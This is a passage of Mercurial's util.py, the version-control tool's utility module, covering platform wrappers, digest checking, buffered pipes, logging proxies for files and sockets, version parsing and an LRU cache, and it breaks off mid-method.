# util.py - Mercurial utility functions and platform specific implementations
#
#  Copyright 2005 K. Thananchayan <thananck@yahoo.com>
#  Copyright 2005-2007 Matt Mackall <mpm@selenic.com>
#  Copyright 2006 Vadim Gelfer <vadim.gelfer@gmail.com>
#
# This software may be used and distributed according to the terms of the
# GNU General Public License version 2 or any later version.

"""Mercurial utility functions and platform specific implementations.

This contains helper routines that are independent of the SCM core and
hide platform-specific details from the core.
"""

from __future__ import absolute_import, print_function

import abc
import bz2
import collections
import contextlib
import errno
import gc
import hashlib
import itertools
import mmap
import os
import platform as pyplatform
import re as remod
import shutil
import socket
import stat
import sys
import time
import traceback
import warnings
import zlib

from .thirdparty import (
    attr,
)
from hgdemandimport import tracing
from . import (
    encoding,
    error,
    i18n,
    node as nodemod,
    policy,
    pycompat,
    urllibcompat,
)
from .utils import (
    procutil,
    stringutil,
)

base85 = policy.importmod(r'base85')
osutil = policy.importmod(r'osutil')
parsers = policy.importmod(r'parsers')

b85decode = base85.b85decode
b85encode = base85.b85encode

cookielib = pycompat.cookielib
httplib = pycompat.httplib
pickle = pycompat.pickle
safehasattr = pycompat.safehasattr
socketserver = pycompat.socketserver
bytesio = pycompat.bytesio
# TODO deprecate stringio name, as it is a lie on Python 3.
stringio = bytesio
xmlrpclib = pycompat.xmlrpclib

httpserver = urllibcompat.httpserver
urlerr = urllibcompat.urlerr
urlreq = urllibcompat.urlreq

# workaround for win32mbcs
_filenamebytestr = pycompat.bytestr

if pycompat.iswindows:
    from . import windows as platform
else:
    from . import posix as platform

_ = i18n._

bindunixsocket = platform.bindunixsocket
cachestat = platform.cachestat
checkexec = platform.checkexec
checklink = platform.checklink
copymode = platform.copymode
expandglobs = platform.expandglobs
getfsmountpoint = platform.getfsmountpoint
getfstype = platform.getfstype
groupmembers = platform.groupmembers
groupname = platform.groupname
isexec = platform.isexec
isowner = platform.isowner
listdir = osutil.listdir
localpath = platform.localpath
lookupreg = platform.lookupreg
makedir = platform.makedir
nlinks = platform.nlinks
normpath = platform.normpath
normcase = platform.normcase
normcasespec = platform.normcasespec
normcasefallback = platform.normcasefallback
openhardlinks = platform.openhardlinks
oslink = platform.oslink
parsepatchoutput = platform.parsepatchoutput
pconvert = platform.pconvert
poll = platform.poll
posixfile = platform.posixfile
readlink = platform.readlink
rename = platform.rename
removedirs = platform.removedirs
samedevice = platform.samedevice
samefile = platform.samefile
samestat = platform.samestat
setflags = platform.setflags
split = platform.split
statfiles = getattr(osutil, 'statfiles', platform.statfiles)
statisexec = platform.statisexec
statislink = platform.statislink
umask = platform.umask
unlink = platform.unlink
username = platform.username

try:
    recvfds = osutil.recvfds
except AttributeError:
    pass

# Python compatibility

_notset = object()

def bitsfrom(container):
    bits = 0
    for bit in container:
        bits |= bit
    return bits

# python 2.6 still have deprecation warning enabled by default. We do not want
# to display anything to standard user so detect if we are running test and
# only use python deprecation warning in this case.
_dowarn = bool(encoding.environ.get('HGEMITWARNINGS'))
if _dowarn:
    # explicitly unfilter our warning for python 2.7
    #
    # The option of setting PYTHONWARNINGS in the test runner was investigated.
    # However, module name set through PYTHONWARNINGS was exactly matched, so
    # we cannot set 'mercurial' and have it match eg: 'mercurial.scmutil'. This
    # makes the whole PYTHONWARNINGS thing useless for our usecase.
    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'mercurial')
    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'hgext')
    warnings.filterwarnings(r'default', r'', DeprecationWarning, r'hgext3rd')
if _dowarn and pycompat.ispy3:
    # silence warning emitted by passing user string to re.sub()
    warnings.filterwarnings(r'ignore', r'bad escape', DeprecationWarning,
                            r'mercurial')
    warnings.filterwarnings(r'ignore', r'invalid escape sequence',
                            DeprecationWarning, r'mercurial')
    # TODO: reinvent imp.is_frozen()
    warnings.filterwarnings(r'ignore', r'the imp module is deprecated',
                            DeprecationWarning, r'mercurial')

def nouideprecwarn(msg, version, stacklevel=1):
    """Issue an python native deprecation warning

    This is a noop outside of tests, use 'ui.deprecwarn' when possible.
    """
    if _dowarn:
        msg += ("\n(compatibility will be dropped after Mercurial-%s,"
                " update your code.)") % version
        warnings.warn(pycompat.sysstr(msg), DeprecationWarning, stacklevel + 1)

DIGESTS = {
    'md5': hashlib.md5,
    'sha1': hashlib.sha1,
    'sha512': hashlib.sha512,
}
# List of digest types from strongest to weakest
DIGESTS_BY_STRENGTH = ['sha512', 'sha1', 'md5']

for k in DIGESTS_BY_STRENGTH:
    assert k in DIGESTS

class digester(object):
    """helper to compute digests.

    This helper can be used to compute one or more digests given their name.

    >>> d = digester([b'md5', b'sha1'])
    >>> d.update(b'foo')
    >>> [k for k in sorted(d)]
    ['md5', 'sha1']
    >>> d[b'md5']
    'acbd18db4cc2f85cedef654fccc4a4d8'
    >>> d[b'sha1']
    '0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33'
    >>> digester.preferred([b'md5', b'sha1'])
    'sha1'
    """

    def __init__(self, digests, s=''):
        self._hashes = {}
        for k in digests:
            if k not in DIGESTS:
                raise error.Abort(_('unknown digest type: %s') % k)
            self._hashes[k] = DIGESTS[k]()
        if s:
            self.update(s)

    def update(self, data):
        for h in self._hashes.values():
            h.update(data)

    def __getitem__(self, key):
        if key not in DIGESTS:
            raise error.Abort(_('unknown digest type: %s') % k)
        return nodemod.hex(self._hashes[key].digest())

    def __iter__(self):
        return iter(self._hashes)

    @staticmethod
    def preferred(supported):
        """returns the strongest digest type in both supported and DIGESTS."""

        for k in DIGESTS_BY_STRENGTH:
            if k in supported:
                return k
        return None

class digestchecker(object):
    """file handle wrapper that additionally checks content against a given
    size and digests.

        d = digestchecker(fh, size, {'md5': '...'})

    When multiple digests are given, all of them are validated.
    """

    def __init__(self, fh, size, digests):
        self._fh = fh
        self._size = size
        self._got = 0
        self._digests = dict(digests)
        self._digester = digester(self._digests.keys())

    def read(self, length=-1):
        content = self._fh.read(length)
        self._digester.update(content)
        self._got += len(content)
        return content

    def validate(self):
        if self._size != self._got:
            raise error.Abort(_('size mismatch: expected %d, got %d') %
                              (self._size, self._got))
        for k, v in self._digests.items():
            if v != self._digester[k]:
                # i18n: first parameter is a digest name
                raise error.Abort(_('%s mismatch: expected %s, got %s') %
                                  (k, v, self._digester[k]))

try:
    buffer = buffer
except NameError:
    def buffer(sliceable, offset=0, length=None):
        if length is not None:
            return memoryview(sliceable)[offset:offset + length]
        return memoryview(sliceable)[offset:]

_chunksize = 4096

class bufferedinputpipe(object):
    """a manually buffered input pipe

    Python will not let us use buffered IO and lazy reading with 'polling' at
    the same time. We cannot probe the buffer state and select will not detect
    that data are ready to read if they are already buffered.

    This class let us work around that by implementing its own buffering
    (allowing efficient readline) while offering a way to know if the buffer is
    empty from the output (allowing collaboration of the buffer with polling).

    This class lives in the 'util' module because it makes use of the 'os'
    module from the python stdlib.
    """
    def __new__(cls, fh):
        # If we receive a fileobjectproxy, we need to use a variation of this
        # class that notifies observers about activity.
        if isinstance(fh, fileobjectproxy):
            cls = observedbufferedinputpipe

        return super(bufferedinputpipe, cls).__new__(cls)

    def __init__(self, input):
        self._input = input
        self._buffer = []
        self._eof = False
        self._lenbuf = 0

    @property
    def hasbuffer(self):
        """True is any data is currently buffered

        This will be used externally a pre-step for polling IO. If there is
        already data then no polling should be set in place."""
        return bool(self._buffer)

    @property
    def closed(self):
        return self._input.closed

    def fileno(self):
        return self._input.fileno()

    def close(self):
        return self._input.close()

    def read(self, size):
        while (not self._eof) and (self._lenbuf < size):
            self._fillbuffer()
        return self._frombuffer(size)

    def unbufferedread(self, size):
        if not self._eof and self._lenbuf == 0:
            self._fillbuffer(max(size, _chunksize))
        return self._frombuffer(min(self._lenbuf, size))

    def readline(self, *args, **kwargs):
        if len(self._buffer) > 1:
            # this should not happen because both read and readline end with a
            # _frombuffer call that collapse it.
            self._buffer = [''.join(self._buffer)]
            self._lenbuf = len(self._buffer[0])
        lfi = -1
        if self._buffer:
            lfi = self._buffer[-1].find('\n')
        while (not self._eof) and lfi < 0:
            self._fillbuffer()
            if self._buffer:
                lfi = self._buffer[-1].find('\n')
        size = lfi + 1
        if lfi < 0: # end of file
            size = self._lenbuf
        elif len(self._buffer) > 1:
            # we need to take previous chunks into account
            size += self._lenbuf - len(self._buffer[-1])
        return self._frombuffer(size)

    def _frombuffer(self, size):
        """return at most 'size' data from the buffer

        The data are removed from the buffer."""
        if size == 0 or not self._buffer:
            return ''
        buf = self._buffer[0]
        if len(self._buffer) > 1:
            buf = ''.join(self._buffer)

        data = buf[:size]
        buf = buf[len(data):]
        if buf:
            self._buffer = [buf]
            self._lenbuf = len(buf)
        else:
            self._buffer = []
            self._lenbuf = 0
        return data

    def _fillbuffer(self, size=_chunksize):
        """read data to the buffer"""
        data = os.read(self._input.fileno(), size)
        if not data:
            self._eof = True
        else:
            self._lenbuf += len(data)
            self._buffer.append(data)

        return data

def mmapread(fp):
    try:
        fd = getattr(fp, 'fileno', lambda: fp)()
        return mmap.mmap(fd, 0, access=mmap.ACCESS_READ)
    except ValueError:
        # Empty files cannot be mmapped, but mmapread should still work.  Check
        # if the file is empty, and if so, return an empty buffer.
        if os.fstat(fd).st_size == 0:
            return ''
        raise

class fileobjectproxy(object):
    """A proxy around file objects that tells a watcher when events occur.

    This type is intended to only be used for testing purposes. Think hard
    before using it in important code.
    """
    __slots__ = (
        r'_orig',
        r'_observer',
    )

    def __init__(self, fh, observer):
        object.__setattr__(self, r'_orig', fh)
        object.__setattr__(self, r'_observer', observer)

    def __getattribute__(self, name):
        ours = {
            r'_observer',

            # IOBase
            r'close',
            # closed if a property
            r'fileno',
            r'flush',
            r'isatty',
            r'readable',
            r'readline',
            r'readlines',
            r'seek',
            r'seekable',
            r'tell',
            r'truncate',
            r'writable',
            r'writelines',
            # RawIOBase
            r'read',
            r'readall',
            r'readinto',
            r'write',
            # BufferedIOBase
            # raw is a property
            r'detach',
            # read defined above
            r'read1',
            # readinto defined above
            # write defined above
        }

        # We only observe some methods.
        if name in ours:
            return object.__getattribute__(self, name)

        return getattr(object.__getattribute__(self, r'_orig'), name)

    def __nonzero__(self):
        return bool(object.__getattribute__(self, r'_orig'))

    __bool__ = __nonzero__

    def __delattr__(self, name):
        return delattr(object.__getattribute__(self, r'_orig'), name)

    def __setattr__(self, name, value):
        return setattr(object.__getattribute__(self, r'_orig'), name, value)

    def __iter__(self):
        return object.__getattribute__(self, r'_orig').__iter__()

    def _observedcall(self, name, *args, **kwargs):
        # Call the original object.
        orig = object.__getattribute__(self, r'_orig')
        res = getattr(orig, name)(*args, **kwargs)

        # Call a method on the observer of the same name with arguments
        # so it can react, log, etc.
        observer = object.__getattribute__(self, r'_observer')
        fn = getattr(observer, name, None)
        if fn:
            fn(res, *args, **kwargs)

        return res

    def close(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'close', *args, **kwargs)

    def fileno(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'fileno', *args, **kwargs)

    def flush(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'flush', *args, **kwargs)

    def isatty(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'isatty', *args, **kwargs)

    def readable(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'readable', *args, **kwargs)

    def readline(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'readline', *args, **kwargs)

    def readlines(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'readlines', *args, **kwargs)

    def seek(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'seek', *args, **kwargs)

    def seekable(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'seekable', *args, **kwargs)

    def tell(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'tell', *args, **kwargs)

    def truncate(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'truncate', *args, **kwargs)

    def writable(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'writable', *args, **kwargs)

    def writelines(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'writelines', *args, **kwargs)

    def read(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'read', *args, **kwargs)

    def readall(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'readall', *args, **kwargs)

    def readinto(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'readinto', *args, **kwargs)

    def write(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'write', *args, **kwargs)

    def detach(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'detach', *args, **kwargs)

    def read1(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'read1', *args, **kwargs)

class observedbufferedinputpipe(bufferedinputpipe):
    """A variation of bufferedinputpipe that is aware of fileobjectproxy.

    ``bufferedinputpipe`` makes low-level calls to ``os.read()`` that
    bypass ``fileobjectproxy``. Because of this, we need to make
    ``bufferedinputpipe`` aware of these operations.

    This variation of ``bufferedinputpipe`` can notify observers about
    ``os.read()`` events. It also re-publishes other events, such as
    ``read()`` and ``readline()``.
    """
    def _fillbuffer(self):
        res = super(observedbufferedinputpipe, self)._fillbuffer()

        fn = getattr(self._input._observer, r'osread', None)
        if fn:
            fn(res, _chunksize)

        return res

    # We use different observer methods because the operation isn't
    # performed on the actual file object but on us.
    def read(self, size):
        res = super(observedbufferedinputpipe, self).read(size)

        fn = getattr(self._input._observer, r'bufferedread', None)
        if fn:
            fn(res, size)

        return res

    def readline(self, *args, **kwargs):
        res = super(observedbufferedinputpipe, self).readline(*args, **kwargs)

        fn = getattr(self._input._observer, r'bufferedreadline', None)
        if fn:
            fn(res)

        return res

PROXIED_SOCKET_METHODS = {
    r'makefile',
    r'recv',
    r'recvfrom',
    r'recvfrom_into',
    r'recv_into',
    r'send',
    r'sendall',
    r'sendto',
    r'setblocking',
    r'settimeout',
    r'gettimeout',
    r'setsockopt',
}

class socketproxy(object):
    """A proxy around a socket that tells a watcher when events occur.

    This is like ``fileobjectproxy`` except for sockets.

    This type is intended to only be used for testing purposes. Think hard
    before using it in important code.
    """
    __slots__ = (
        r'_orig',
        r'_observer',
    )

    def __init__(self, sock, observer):
        object.__setattr__(self, r'_orig', sock)
        object.__setattr__(self, r'_observer', observer)

    def __getattribute__(self, name):
        if name in PROXIED_SOCKET_METHODS:
            return object.__getattribute__(self, name)

        return getattr(object.__getattribute__(self, r'_orig'), name)

    def __delattr__(self, name):
        return delattr(object.__getattribute__(self, r'_orig'), name)

    def __setattr__(self, name, value):
        return setattr(object.__getattribute__(self, r'_orig'), name, value)

    def __nonzero__(self):
        return bool(object.__getattribute__(self, r'_orig'))

    __bool__ = __nonzero__

    def _observedcall(self, name, *args, **kwargs):
        # Call the original object.
        orig = object.__getattribute__(self, r'_orig')
        res = getattr(orig, name)(*args, **kwargs)

        # Call a method on the observer of the same name with arguments
        # so it can react, log, etc.
        observer = object.__getattribute__(self, r'_observer')
        fn = getattr(observer, name, None)
        if fn:
            fn(res, *args, **kwargs)

        return res

    def makefile(self, *args, **kwargs):
        res = object.__getattribute__(self, r'_observedcall')(
            r'makefile', *args, **kwargs)

        # The file object may be used for I/O. So we turn it into a
        # proxy using our observer.
        observer = object.__getattribute__(self, r'_observer')
        return makeloggingfileobject(observer.fh, res, observer.name,
                                     reads=observer.reads,
                                     writes=observer.writes,
                                     logdata=observer.logdata,
                                     logdataapis=observer.logdataapis)

    def recv(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'recv', *args, **kwargs)

    def recvfrom(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'recvfrom', *args, **kwargs)

    def recvfrom_into(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'recvfrom_into', *args, **kwargs)

    def recv_into(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'recv_info', *args, **kwargs)

    def send(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'send', *args, **kwargs)

    def sendall(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'sendall', *args, **kwargs)

    def sendto(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'sendto', *args, **kwargs)

    def setblocking(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'setblocking', *args, **kwargs)

    def settimeout(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'settimeout', *args, **kwargs)

    def gettimeout(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'gettimeout', *args, **kwargs)

    def setsockopt(self, *args, **kwargs):
        return object.__getattribute__(self, r'_observedcall')(
            r'setsockopt', *args, **kwargs)

class baseproxyobserver(object):
    def _writedata(self, data):
        if not self.logdata:
            if self.logdataapis:
                self.fh.write('\n')
                self.fh.flush()
            return

        # Simple case writes all data on a single line.
        if b'\n' not in data:
            if self.logdataapis:
                self.fh.write(': %s\n' % stringutil.escapestr(data))
            else:
                self.fh.write('%s>     %s\n'
                              % (self.name, stringutil.escapestr(data)))
            self.fh.flush()
            return

        # Data with newlines is written to multiple lines.
        if self.logdataapis:
            self.fh.write(':\n')

        lines = data.splitlines(True)
        for line in lines:
            self.fh.write('%s>     %s\n'
                          % (self.name, stringutil.escapestr(line)))
        self.fh.flush()

class fileobjectobserver(baseproxyobserver):
    """Logs file object activity."""
    def __init__(self, fh, name, reads=True, writes=True, logdata=False,
                 logdataapis=True):
        self.fh = fh
        self.name = name
        self.logdata = logdata
        self.logdataapis = logdataapis
        self.reads = reads
        self.writes = writes

    def read(self, res, size=-1):
        if not self.reads:
            return
        # Python 3 can return None from reads at EOF instead of empty strings.
        if res is None:
            res = ''

        if size == -1 and res == '':
            # Suppress pointless read(-1) calls that return
            # nothing. These happen _a lot_ on Python 3, and there
            # doesn't seem to be a better workaround to have matching
            # Python 2 and 3 behavior. :(
            return

        if self.logdataapis:
            self.fh.write('%s> read(%d) -> %d' % (self.name, size, len(res)))

        self._writedata(res)

    def readline(self, res, limit=-1):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> readline() -> %d' % (self.name, len(res)))

        self._writedata(res)

    def readinto(self, res, dest):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> readinto(%d) -> %r' % (self.name, len(dest),
                                                      res))

        data = dest[0:res] if res is not None else b''
        self._writedata(data)

    def write(self, res, data):
        if not self.writes:
            return

        # Python 2 returns None from some write() calls. Python 3 (reasonably)
        # returns the integer bytes written.
        if res is None and data:
            res = len(data)

        if self.logdataapis:
            self.fh.write('%s> write(%d) -> %r' % (self.name, len(data), res))

        self._writedata(data)

    def flush(self, res):
        if not self.writes:
            return

        self.fh.write('%s> flush() -> %r\n' % (self.name, res))

    # For observedbufferedinputpipe.
    def bufferedread(self, res, size):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> bufferedread(%d) -> %d' % (
                self.name, size, len(res)))

        self._writedata(res)

    def bufferedreadline(self, res):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> bufferedreadline() -> %d' % (
                self.name, len(res)))

        self._writedata(res)

def makeloggingfileobject(logh, fh, name, reads=True, writes=True,
                          logdata=False, logdataapis=True):
    """Turn a file object into a logging file object."""

    observer = fileobjectobserver(logh, name, reads=reads, writes=writes,
                                  logdata=logdata, logdataapis=logdataapis)
    return fileobjectproxy(fh, observer)

class socketobserver(baseproxyobserver):
    """Logs socket activity."""
    def __init__(self, fh, name, reads=True, writes=True, states=True,
                 logdata=False, logdataapis=True):
        self.fh = fh
        self.name = name
        self.reads = reads
        self.writes = writes
        self.states = states
        self.logdata = logdata
        self.logdataapis = logdataapis

    def makefile(self, res, mode=None, bufsize=None):
        if not self.states:
            return

        self.fh.write('%s> makefile(%r, %r)\n' % (
            self.name, mode, bufsize))

    def recv(self, res, size, flags=0):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> recv(%d, %d) -> %d' % (
                self.name, size, flags, len(res)))
        self._writedata(res)

    def recvfrom(self, res, size, flags=0):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> recvfrom(%d, %d) -> %d' % (
                self.name, size, flags, len(res[0])))

        self._writedata(res[0])

    def recvfrom_into(self, res, buf, size, flags=0):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> recvfrom_into(%d, %d) -> %d' % (
                self.name, size, flags, res[0]))

        self._writedata(buf[0:res[0]])

    def recv_into(self, res, buf, size=0, flags=0):
        if not self.reads:
            return

        if self.logdataapis:
            self.fh.write('%s> recv_into(%d, %d) -> %d' % (
                self.name, size, flags, res))

        self._writedata(buf[0:res])

    def send(self, res, data, flags=0):
        if not self.writes:
            return

        self.fh.write('%s> send(%d, %d) -> %d' % (
            self.name, len(data), flags, len(res)))
        self._writedata(data)

    def sendall(self, res, data, flags=0):
        if not self.writes:
            return

        if self.logdataapis:
            # Returns None on success. So don't bother reporting return value.
            self.fh.write('%s> sendall(%d, %d)' % (
                self.name, len(data), flags))

        self._writedata(data)

    def sendto(self, res, data, flagsoraddress, address=None):
        if not self.writes:
            return

        if address:
            flags = flagsoraddress
        else:
            flags = 0

        if self.logdataapis:
            self.fh.write('%s> sendto(%d, %d, %r) -> %d' % (
                self.name, len(data), flags, address, res))

        self._writedata(data)

    def setblocking(self, res, flag):
        if not self.states:
            return

        self.fh.write('%s> setblocking(%r)\n' % (self.name, flag))

    def settimeout(self, res, value):
        if not self.states:
            return

        self.fh.write('%s> settimeout(%r)\n' % (self.name, value))

    def gettimeout(self, res):
        if not self.states:
            return

        self.fh.write('%s> gettimeout() -> %f\n' % (self.name, res))

    def setsockopt(self, res, level, optname, value):
        if not self.states:
            return

        self.fh.write('%s> setsockopt(%r, %r, %r) -> %r\n' % (
            self.name, level, optname, value, res))

def makeloggingsocket(logh, fh, name, reads=True, writes=True, states=True,
                      logdata=False, logdataapis=True):
    """Turn a socket into a logging socket."""

    observer = socketobserver(logh, name, reads=reads, writes=writes,
                              states=states, logdata=logdata,
                              logdataapis=logdataapis)
    return socketproxy(fh, observer)

def version():
    """Return version information if available."""
    try:
        from . import __version__
        return __version__.version
    except ImportError:
        return 'unknown'

def versiontuple(v=None, n=4):
    """Parses a Mercurial version string into an N-tuple.

    The version string to be parsed is specified with the ``v`` argument.
    If it isn't defined, the current Mercurial version string will be parsed.

    ``n`` can be 2, 3, or 4. Here is how some version strings map to
    returned values:

    >>> v = b'3.6.1+190-df9b73d2d444'
    >>> versiontuple(v, 2)
    (3, 6)
    >>> versiontuple(v, 3)
    (3, 6, 1)
    >>> versiontuple(v, 4)
    (3, 6, 1, '190-df9b73d2d444')

    >>> versiontuple(b'3.6.1+190-df9b73d2d444+20151118')
    (3, 6, 1, '190-df9b73d2d444+20151118')

    >>> v = b'3.6'
    >>> versiontuple(v, 2)
    (3, 6)
    >>> versiontuple(v, 3)
    (3, 6, None)
    >>> versiontuple(v, 4)
    (3, 6, None, None)

    >>> v = b'3.9-rc'
    >>> versiontuple(v, 2)
    (3, 9)
    >>> versiontuple(v, 3)
    (3, 9, None)
    >>> versiontuple(v, 4)
    (3, 9, None, 'rc')

    >>> v = b'3.9-rc+2-02a8fea4289b'
    >>> versiontuple(v, 2)
    (3, 9)
    >>> versiontuple(v, 3)
    (3, 9, None)
    >>> versiontuple(v, 4)
    (3, 9, None, 'rc+2-02a8fea4289b')

    >>> versiontuple(b'4.6rc0')
    (4, 6, None, 'rc0')
    >>> versiontuple(b'4.6rc0+12-425d55e54f98')
    (4, 6, None, 'rc0+12-425d55e54f98')
    >>> versiontuple(b'.1.2.3')
    (None, None, None, '.1.2.3')
    >>> versiontuple(b'12.34..5')
    (12, 34, None, '..5')
    >>> versiontuple(b'1.2.3.4.5.6')
    (1, 2, 3, '.4.5.6')
    """
    if not v:
        v = version()
    m = remod.match(br'(\d+(?:\.\d+){,2})[\+-]?(.*)', v)
    if not m:
        vparts, extra = '', v
    elif m.group(2):
        vparts, extra = m.groups()
    else:
        vparts, extra = m.group(1), None

    vints = []
    for i in vparts.split('.'):
        try:
            vints.append(int(i))
        except ValueError:
            break
    # (3, 6) -> (3, 6, None)
    while len(vints) < 3:
        vints.append(None)

    if n == 2:
        return (vints[0], vints[1])
    if n == 3:
        return (vints[0], vints[1], vints[2])
    if n == 4:
        return (vints[0], vints[1], vints[2], extra)

def cachefunc(func):
    '''cache the result of function calls'''
    # XXX doesn't handle keywords args
    if func.__code__.co_argcount == 0:
        cache = []
        def f():
            if len(cache) == 0:
                cache.append(func())
            return cache[0]
        return f
    cache = {}
    if func.__code__.co_argcount == 1:
        # we gain a small amount of time because
        # we don't need to pack/unpack the list
        def f(arg):
            if arg not in cache:
                cache[arg] = func(arg)
            return cache[arg]
    else:
        def f(*args):
            if args not in cache:
                cache[args] = func(*args)
            return cache[args]

    return f

class cow(object):
    """helper class to make copy-on-write easier

    Call preparewrite before doing any writes.
    """

    def preparewrite(self):
        """call this before writes, return self or a copied new object"""
        if getattr(self, '_copied', 0):
            self._copied -= 1
            return self.__class__(self)
        return self

    def copy(self):
        """always do a cheap copy"""
        self._copied = getattr(self, '_copied', 0) + 1
        return self

class sortdict(collections.OrderedDict):
    '''a simple sorted dictionary

    >>> d1 = sortdict([(b'a', 0), (b'b', 1)])
    >>> d2 = d1.copy()
    >>> d2
    sortdict([('a', 0), ('b', 1)])
    >>> d2.update([(b'a', 2)])
    >>> list(d2.keys()) # should still be in last-set order
    ['b', 'a']
    '''

    def __setitem__(self, key, value):
        if key in self:
            del self[key]
        super(sortdict, self).__setitem__(key, value)

    if pycompat.ispypy:
        # __setitem__() isn't called as of PyPy 5.8.0
        def update(self, src):
            if isinstance(src, dict):
                src = src.iteritems()
            for k, v in src:
                self[k] = v

class cowdict(cow, dict):
    """copy-on-write dict

    Be sure to call d = d.preparewrite() before writing to d.

    >>> a = cowdict()
    >>> a is a.preparewrite()
    True
    >>> b = a.copy()
    >>> b is a
    True
    >>> c = b.copy()
    >>> c is a
    True
    >>> a = a.preparewrite()
    >>> b is a
    False
    >>> a is a.preparewrite()
    True
    >>> c = c.preparewrite()
    >>> b is c
    False
    >>> b is b.preparewrite()
    True
    """

class cowsortdict(cow, sortdict):
    """copy-on-write sortdict

    Be sure to call d = d.preparewrite() before writing to d.
    """

class transactional(object):
    """Base class for making a transactional type into a context manager."""
    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def close(self):
        """Successfully closes the transaction."""

    @abc.abstractmethod
    def release(self):
        """Marks the end of the transaction.

        If the transaction has not been closed, it will be aborted.
        """

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            if exc_type is None:
                self.close()
        finally:
            self.release()

@contextlib.contextmanager
def acceptintervention(tr=None):
    """A context manager that closes the transaction on InterventionRequired

    If no transaction was provided, this simply runs the body and returns
    """
    if not tr:
        yield
        return
    try:
        yield
        tr.close()
    except error.InterventionRequired:
        tr.close()
        raise
    finally:
        tr.release()

@contextlib.contextmanager
def nullcontextmanager():
    yield

class _lrucachenode(object):
    """A node in a doubly linked list.

    Holds a reference to nodes on either side as well as a key-value
    pair for the dictionary entry.
    """
    __slots__ = (u'next', u'prev', u'key', u'value', u'cost')

    def __init__(self):
        self.next = None
        self.prev = None

        self.key = _notset
        self.value = None
        self.cost = 0

    def markempty(self):
        """Mark the node as emptied."""
        self.key = _notset
        self.value = None
        self.cost = 0

class lrucachedict(object):
    """Dict that caches most recent accesses and sets.

    The dict consists of an actual backing dict - indexed by original
    key - and a doubly linked circular list defining the order of entries in
    the cache.

    The head node is the newest entry in the cache. If the cache is full,
    we recycle head.prev and make it the new head. Cache accesses result in
    the node being moved to before the existing head and being marked as the
    new head node.

    Items in the cache can be inserted with an optional "cost" value. This is
    simply an integer that is specified by the caller. The cache can be queried
    for the total cost of all items presently in the cache.

    The cache can also define a maximum cost. If a cache insertion would
    cause the total cost of the cache to go beyond the maximum cost limit,
    nodes will be evicted to make room for the new code. This can be used
    to e.g. set a max memory limit and associate an estimated bytes size
    cost to each item in the cache. By default, no maximum cost is enforced.
    """
    def __init__(self, max, maxcost=0):
        self._cache = {}

        self._head = head = _lrucachenode()
        head.prev = head
        head.next = head
        self._size = 1
        self.capacity = max
        self.totalcost = 0
        self.maxcost = maxcost

    def __len__(self):
        return len(self._cache)

    def __contains__(self, k):
        return k in self._cache

    def __iter__(self):
        # We don't have to iterate in cache order, but why not.
        n = self._head
        for i in range(len(self._cache)):
            yield n.key
            n = n.next

    def __getitem__(self, k):
        node = self._cache[k]
        self._movetohead(node)
        return node.value

    def insert(self, k, v, cost=0):
        """Insert a new item in the cache with optional cost value."""
        node = self._cache.get(k)
        # Replace existing value and mark as newest.
        if node is not None:
            self.totalcost -= node.cost
            node.value = v
            node.cost = cost
            self.totalcost += cost
            self._movetohead(node)

            if self.maxcost:
                self._enforcecostlimit()

            return

        if self._size < self.capacity:
            node = self._addcapacity()
        else:
            # Grab the last/oldest item.
            node = self._head.prev

        # At capacity. Kill the old entry.
        if node.key is not _notset:
            self.totalcost -= node.cost
            del self._cache[node.key]

        node.key = k
        node.value = v
        node.cost = cost
        self.totalcost += cost
        self._cache[k] = node
        # And mark it as newest entry. No need to adjust order since it
        # is already self._head.prev.
        self._head = node

        if self.maxcost:
            self._enforcecostlimit()

    def __setitem__(self, k, v):
        self.insert(k, v)

    def __delitem__(self, k):
        node = self._cache.pop(k)
        self.totalcost -= node.cost
        node.markempty()

        # Temporarily mark as newest item before re-adjusting head to make
        # this node the oldest item.
